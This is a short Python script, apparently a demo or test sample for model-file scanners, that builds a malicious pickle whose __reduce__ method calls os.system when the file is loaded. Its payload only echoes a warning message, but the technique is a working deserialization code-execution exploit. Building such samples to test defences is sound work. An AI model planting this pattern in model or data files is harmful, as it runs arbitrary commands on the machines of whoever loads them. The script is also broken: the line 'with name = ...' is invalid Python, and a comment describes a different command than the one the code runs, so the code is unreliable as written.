import pickle
import os

# This class defines the "Poison"
# When a victim opens this file, it will run 'echo HACKED'
class Poison:
    def __reduce__(self):
        # This is the "Magic" method that tells Python what to do when loading
        return (os.system, ('echo YOUR PIPELINE JUST CAUGHT A MALICIOUS MODEL!',))

# Create the poisoned object
malicious_model = Poison()

# Save it as a .pkl file
with name = 'poisoned_model.pkl'
with open(name, 'wb') as f:
    pickle.dump(malicious_model, f)

print(f"Poisoned model created: {name}")
